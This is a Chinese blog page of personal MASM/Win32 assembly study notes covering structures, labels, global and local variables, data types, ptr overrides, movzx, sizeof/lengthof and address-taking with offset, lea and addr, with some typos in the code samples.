<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov	esi,offset stWndClass</span><br><span class="line">move ax,[esi+WNDCLASS.lpfnWndProc]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意第二句是<code>move ax,[esi+WNDCLASS.lpfnWndProc]</code>而不是<code>move ax,[esi+stWndClass.lpfnWndProc]</code>，因为前者被编译成<code>mov eax,[esi+4]</code>，而后者被编译成<code>mov eax,[esi+403004h]</code>，后者的结果显然是错误的</p>
</blockquote>
<p>MASM中还有一个用法，可以用assume伪指令把寄存器预先定义为结构指针，再进行操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov	esi,offset stWndClass</span><br><span class="line">assume	esi:ptr WNDCLASS</span><br><span class="line">movea	ax,[esi].lpfnWndProc</span><br><span class="line">...</span><br><span class="line">assume	esi:nothing</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：在不再使用esi寄存器做指针的时候要用<code>assume esi:nothing</code>取消定义</p>
</blockquote>
<h2 id="结构定义的嵌套"><a href="#结构定义的嵌套" class="headerlink" title="结构定义的嵌套"></a>结构定义的嵌套</h2><p>结构的定义也可以嵌套，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NEW_WNDCLASS	struct</span><br><span class="line">	DwOption	dword	?</span><br><span class="line">	OldWndClass	WNDCLASS	&lt;&gt;</span><br><span class="line">NEW_WNDCLASS	ends</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/27/80x86╗π▒α▒╩╝╟03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/27/80x86╗π▒α▒╩╝╟03/" class="post-title-link" itemprop="url">80x86汇编笔记03</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-27 19:32:11" itemprop="dateCreated datePublished" datetime="2020-02-27T19:32:11-08:00">2020-02-27</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-28 11:32:36" itemprop="dateModified" datetime="2020-02-28T11:32:36-08:00">2020-02-28</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="标号、变量和数据结构"><a href="#标号、变量和数据结构" class="headerlink" title="标号、变量和数据结构"></a>标号、变量和数据结构</h2><p>当程序中要跳转到另一位置时，需要有一个标识来指示位置，这就是标号，通过在目的地址的前面放一个标号，可以在指令中使用标号来代替直接使用地址</p>
<p>变量的值在程序运行中是经常改变的，所以它必须定义在可写的段内，如data和data?，或者在堆栈内。按照定义的位置不同，MASM中的变量也分为全局变量和局部变量</p>
<p>在MASM中标号和变量的命名规范是相同的：</p>
<ul>
<li>可以用字母、数字、下划线以及符号@、$和？</li>
<li>第一个符号不能是数字</li>
<li>长度不能超过240个字符</li>
<li>不能使用指令名等关键字</li>
<li>在作用域内必须是唯一的</li>
</ul>
<h2 id="标号的定义"><a href="#标号的定义" class="headerlink" title="标号的定义"></a>标号的定义</h2><p>格式一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标号名： 目的指令</span><br></pre></td></tr></table></figure>

<p>格式二：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标号名:: 目的指令</span><br></pre></td></tr></table></figure>

<p>标号的作用域是当前的子程序，在不同子程序中可以存在同样名字的标号，这也就意味着这种格式不能从一个子程序通过标号跳转到另一个子程序中。如果是在需要从一个子程序中用指令跳转到另一个子程序中的标号位置时候，我们用格式二</p>
<h2 id><a href="#" class="headerlink" title="@@"></a>@@</h2><p>因为标号有限，我们一般用下面的方式来取标号，节省标号开支</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov	cx,1234h</span><br><span class="line">cmp flag,1</span><br><span class="line">je	@F	；F这里是Forward的意思</span><br><span class="line">mov	cx,1000h</span><br><span class="line">@@:</span><br><span class="line">	lopp @B ;B这里是Before的意思</span><br></pre></td></tr></table></figure>

<p>当用@@做标号时，@F表示本条指令后的第一个@@标号，@B表示本条指令前的第一个@@标号</p>
<blockquote>
<p>当程序中可以有多个@@标号，@B和@F只寻找匹配最近的一个</p>
</blockquote>
<p>不要在间隔太远的代码中使用@@符号，距离最好限制在编辑器能够显示的同一屏幕的范围内</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量的作用域是整个程序，Win32汇编的全局变量定义在data或data？段内，可以同时定义变量的类型和长度，格式如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名	类型	初始值1，初始值2，……</span><br><span class="line">变量名	类型	初重复数量 dup(始值1，初始值2，……)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">表示方式</th>
<th align="center">缩写</th>
<th align="center">长度（字节）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">字节</td>
<td align="center">byte</td>
<td align="center">db</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">字</td>
<td align="center">word</td>
<td align="center">dw</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">双字(double word)</td>
<td align="center">dword</td>
<td align="center">dd</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">三字(far word)</td>
<td align="center">fword</td>
<td align="center">df</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">四字(quad word)</td>
<td align="center">qword</td>
<td align="center">dq</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">十字节BCD码(ten byte)</td>
<td align="center">tbyte</td>
<td align="center">dt</td>
<td align="center">10</td>
</tr>
<tr>
<td align="center">有符号字节(sign byte)</td>
<td align="center">sbyte</td>
<td align="center"></td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">有符号子(sign byte)</td>
<td align="center">sword</td>
<td align="center"></td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">有符号双字(sign dword)</td>
<td align="center">sdword</td>
<td align="center"></td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">单精度浮点数</td>
<td align="center">real4</td>
<td align="center"></td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">双精度浮点数</td>
<td align="center">real8</td>
<td align="center"></td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">10字节浮点数</td>
<td align="center">real10</td>
<td align="center"></td>
<td align="center">10</td>
</tr>
</tbody></table>
<blockquote>
<p>所有使用到变量类型的情况中，只有定义全局变量的时候才可以用缩写</p>
</blockquote>
<p>在byte类型变量的定义中，可以用引号定义字符串和数值定义的方法混用</p>
<p>假设要定义两个字符串Hello,World!和Hello again，每个字符串后面中回车和换行符，最后以一个0字符结尾，可以定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">szText	db	&quot;Hello World!&quot;,0dh,0ah,\</span><br><span class="line">&quot;Hello again&quot;,0dh,0ah,0</span><br></pre></td></tr></table></figure>

<p>DOS和Windows采用回车+换行(CR/LF)表示下一行，而UNIX/Linux采用换行符(LF)表示下一行，macOS则采用回车符(CR)表示下一行</p>
<ul>
<li>CR用符号”\r”表示，十进制ASCII代码是13，十六进制代码为0x0D</li>
<li>LF使用”\n“符号表示，ASCII代码是10，十六进制为0x0A</li>
</ul>
<p>全局变量在定义中既可以指定初值，也可以预留，在data？段中，只能用问号预留空间，在data？段中不能指定初始值</p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量这个概念出现以后，两个以上子程序都要用到的数据才被定义为全局变量统一放在数据段中，仅在子程序内部使用的变量则放在堆栈中，这样还可以使得子程序编程黑匣子的模样，使程序的模块结构更加分明</p>
<p>局部变量的作用域是单个子程序，在进入子程序的时候，通过修改堆栈指针esp来预留出需要的空间，再用ret指令返回主程序之前，同样通过恢复esp丢弃这些空间</p>
<p>局部变量因为空间是临时分配的，所以无法定义含有初始化值的变量，对局部变量的初始化一般在子程序中由指令完成</p>
<h4 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h4><p>MASM用local伪指令提供了对局部变量的支持，格式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local 变量名1[[重复数量]][:类型]，变量名2[[重复数量]][:类型]……</span><br></pre></td></tr></table></figure>

<p>local伪指令必须紧接在子程序定义的伪指令proc后，其它指令开始前，这是因为局部变量的数目必须在子程序开始的时候就确定下来系统才知道如何分配，在一个local语句定义不下的时候，可以有多个local语句，<strong>语法中的数据类型不能用缩写</strong></p>
<ul>
<li>Win32汇编默认的类型是dword，如果定义dword类型的局部变量，则类型可以省略</li>
<li>当定义数组的时候，可以[]括号起来。<strong>不能使用定义全局变量的dup伪指令</strong></li>
<li>局部变量不能和已定义的全局变量同名</li>
<li>局部变量的作用域是当前子程序，所以在不同的子程序中可以有同名的局部变量</li>
</ul>
<p>一些例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local	loc1[1024]:byte	;定义了一个1024字节长的局部变量loc1</span><br><span class="line">local	loc2	;定义了一个名为loc2的局部变量，类型是默认值dword</span><br><span class="line">local	loc3：WNDCLASS	;定义了一个WNDCLASS数据结构，名为loc3</span><br></pre></td></tr></table></figure>

<h4 id="局部变量的使用"><a href="#局部变量的使用" class="headerlink" title="局部变量的使用"></a>局部变量的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TestProc proc	;名为TestProc的子程序</span><br><span class="line">local	@loc1:dword,@loc2:word</span><br><span class="line">local	@loc3:byte	;用local语句定义了3个变量</span><br><span class="line">mov	eax,@loc1	;对应类型进行转储，然后返回</span><br><span class="line">mov	ax,@loc2</span><br><span class="line">mov	al,@loc3</span><br><span class="line">ret</span><br><span class="line">TestProc	endp</span><br></pre></td></tr></table></figure>

<p>其实在编译后的文件再反汇编的话，可以发现编译器编译后的指令比源程序多了前后两段指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov	ebp,esp</span><br><span class="line">add	esp,FFFFFFF8</span><br><span class="line">……</span><br><span class="line">leave</span><br></pre></td></tr></table></figure>

<p>这就是使用局部变量所必须的指令，分别用于局部变量的准备工作和扫尾工作</p>
<h5 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h5><ul>
<li>当调用者执行了call TestProc指令后，CPU把返回的地址（当前地址）压入堆栈，再转移（jmp）到子程序执行</li>
<li>esp在程序的执行过程中可能随时用到，不可能用esp来随时存取局部变量，ebp寄存器是以堆栈段为默认数据段的，所以，可以用ebp做指针指向堆栈代替esp</li>
<li>于是，在初始化前，先用一句push ebp指令把原来的ebp保存起来，然后把esp的值传递给ebp</li>
</ul>
<p>因为在80386处理器中，以dword(32位)为界对齐时读取内存速度最快，所以MASM宁可浪费一些内存单元进行对齐</p>
<p>在程序退出前，必须把正确的esp设置回去，否则，ret指令会从堆栈中取出错误的地址返回，因为有<code>mov ebp,esp</code>，所以要返回的时候只要先<code>mov esp,ebp</code>，然后再<code>pop ebp</code>，堆栈就是正确的了</p>
<p>在80386指令集中有一条指令可以在一句中实现这些功能，就是leave指令，所以，编译器在ret指令之前只使用了一句leave指令</p>
<p>和全局变量不一样，局部变量的初始值是随机的，是其他子程序执行后在堆栈里留下的垃圾（因为我们知道，腾出空间只是改变栈指针esp），所以，对局部变量的值一定要初始化，特别是定义为结构后当参数传递给API函数的时候</p>
<h2 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h2><p>在MASM中以不同的类型访问不会对变量造成影响。在MASM中，如果要用指定类型之外的长度访问变量，必须显式地指出要访问地长度，这样编译器忽略语法上的长度检验，仅使用变量地地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型	ptr	变量名</span><br></pre></td></tr></table></figure>

<p>类型可以是byte，word，dword，fword，qword，real8和real10，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov	ax,word	ptr	szBuffer</span><br></pre></td></tr></table></figure>

<blockquote>
<p>指定类型地参数访问并不会去检测长度是否溢出</p>
</blockquote>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">bTest1 db 12h</span><br><span class="line">wTest2 dw 1234h</span><br><span class="line">dwTest3 dd 12345678h</span><br><span class="line">……</span><br><span class="line">.code</span><br><span class="line">mov	al,bTest1</span><br><span class="line">mov	ax,word ptr bTest1</span><br><span class="line">mov eax,dowrd ptr bTest1</span><br></pre></td></tr></table></figure>

<p><code>mov al,bTest1</code>这一句显然使al等于12h，下面的两句，ax和eax难道等于0012h和00000012h吗？实际运行的结果使3412h和78123412h</p>
<p>下面是反汇编后的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;.data段中的变量</span><br><span class="line">;.data段中变量是按顺序从低地址往高地址排列的，对于超过一个字节的数据，80386处理器的数据排列方式是小端序</span><br><span class="line">00403000 12 34 12 78 56 34 12</span><br><span class="line">;.code段中的代码</span><br><span class="line">00401000	A000304000	mov	al,byte	ptr [00403000]</span><br><span class="line">00401005	66A10030400	mov	ax,word	ptr [00403000]</span><br><span class="line">0040100B	A100304000	mov eax,dword	ptr [00403000]</span><br></pre></td></tr></table></figure>

<p>在执行指令<code>mov ax,word ptr bTest1</code>的时候，是从bTest1的地址403000h处取一个字，其长度已经超过了bTest1的范围并落到了wTest2中。从内存中看，是取了bTest1的数据12h和wTest2的低位数据34h，在这两个字节中，12h位于低地址，所以ax中的数值是3412h</p>
<p>同理，看<code>mov eax,dword ptr bTest1</code>这条指令取了bTest1，wTest2的全部和dwTest3的最低位78h，在内存中的排列是12h 34h 12h 78h，所以eax等于78123412h</p>
<blockquote>
<p>这个例子说明了汇编用ptr强制覆盖变量长度的时候，实质上是只用了变量的地址而禁止编译器进行检验。编译器并不会考虑定界的问题，程序员在使用的时候必须对内存中的数据排列有个全局概念，以免越界存取到意料之外的数据</p>
</blockquote>
<p>如果只是想把bTest1的一个字节拓展到一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量，80386处理器提供的movzx指令可以实现这个功能，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movzx	ax,bTest1	;ax == 0012h</span><br><span class="line">movzx	eax,bTest1	;eax == 00000012h</span><br><span class="line">movzx	eax,cl		;eax == 000000(cl)</span><br><span class="line">movzx	eax,ax		;eax == 0000(ax)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>用movzx指令进行数据长度扩展是Win32汇编中常用技巧</p>
</blockquote>
<p>movsx是有符号的数据扩展</p>
<h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><p>在源程序中用到变量的尺寸和数量的时候，可以用sizeof和lengthof伪指令来实现，格式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizeof	变量名、数据类型或数据结构名</span><br><span class="line">lengthof	变量名</span><br></pre></td></tr></table></figure>

<p>它们的区别是：</p>
<ul>
<li>sizeof伪指令可以取得变量、数据类型或数据结构以字节为单位的长度</li>
<li>lengthof则可以取得变量中数据的项数</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stWndClass	WNDCALSS &lt;&gt;</span><br><span class="line">szHello	db	&apos;Hello,world&apos;,0</span><br><span class="line">dwTest	dd	1,2,3,4</span><br><span class="line">...</span><br><span class="line">.code</span><br><span class="line">...</span><br><span class="line">mov	eax,sizeof stWndClass</span><br><span class="line">mov ebx,sizeof	WNDCLASS</span><br><span class="line">mov ecx,sizeof	szHello</span><br><span class="line">mov edx,sizeof	doword</span><br><span class="line">mov esi,sizeof	dwTest</span><br></pre></td></tr></table></figure>

<ul>
<li>执行后eax的值是stWndClass结构的长度：40</li>
<li>ebx同样是：40</li>
<li>ecx的值是szHello的长度：13</li>
<li>edx的值是一个双字的长度：4</li>
</ul>
<p>如果把所有的sizeof换成lengthof：</p>
<ul>
<li>那么eax会等于1，因为只定义了1项WNDCLASS</li>
<li>ecx同样等于13</li>
<li>esi则等于4</li>
<li>lengthof WNDCLASST和lengthof dword是非法的用法，编译器报错</li>
</ul>
<p>如果分两行定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">szHello	db	&apos;hello&apos;,0dh,0ah</span><br><span class="line">		db	&apos;world&apos;,0</span><br></pre></td></tr></table></figure>

<p>sizeof szHello的值是7而不是13.因为MASM中的变量定义只认一行，后一行实际上是另一个没有名称的数据定义</p>
<h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><p>获取变量地址的操作对于全局变量和局部变量是不同的</p>
<h3 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h3><p>对于全局变量，它的地址在编译的时候已经由编译器确定了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov	寄存器，offset 变量名</span><br></pre></td></tr></table></figure>

<p>其中offset是取变量地址的伪操作符</p>
<h3 id="局部变量-1"><a href="#局部变量-1" class="headerlink" title="局部变量"></a>局部变量</h3><p>对于局部变量，它是用ebp来做指针操作的，假设ebp的值是40100h，那么第一个局部变量的地址是ebp-4即400FCh</p>
<p>由于ebp的值随着程序的执行环境不同可能是不同的，所以局部变量的地址值在编译的时候也是不确定的，不能用offset伪操作符来获取它的地址</p>
<h3 id="取指针的地址"><a href="#取指针的地址" class="headerlink" title="取指针的地址"></a>取指针的地址</h3><p>80386处理器中有一条指令用来获取指针的地址，就是lea指令，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea	eax,[ebp-4]</span><br></pre></td></tr></table></figure>

<p>该指令可以在运行时按照ebp的值实际计算出地址放到eax中</p>
<p>如果要在invoke伪指令的参数中用到一个局部变量的地址，MASM对此有一个专用的伪操作符addr，其格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr 局部变量名 或 全局变量名</span><br></pre></td></tr></table></figure>

<p>当addr后跟全局变量名的时候，用法和offset是相同的</p>
<p>当addr后面跟局部变量名的时候，编译器自动用lea指令先把地址取到eax中，然后用eax来代替变量地址</p>
<blockquote>
<p>addr伪操作符只能在invoke的参数中使用，不能用在类似的场合：</p>
<p><code>move ax,addr 局部变量名</code></p>
</blockquote>
<p>假设在一个子程序中有如下invoke指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke	Test,eax,addr szHello</span><br></pre></td></tr></table></figure>

<p>编译器会把invoke伪指令和addr翻译成下面这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[ebp-4]</span><br><span class="line">push eax	;参数2：addr szHello</span><br><span class="line">push eax	;参数1：eax</span><br><span class="line">call Test</span><br></pre></td></tr></table></figure>

<p>编译器会报错，也就是说，要用到的eax的值不再有效，所以挡在invoke中使用addr伪操作符时，注意在它的前面不能用eax，否则eax的值会被覆盖掉，当然eax在addr的后面的参数中用是可以的</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Inhaltsverzeichnis
        </li>
        <li class="sidebar-nav-overview">
          Übersicht
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">Kategorien</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
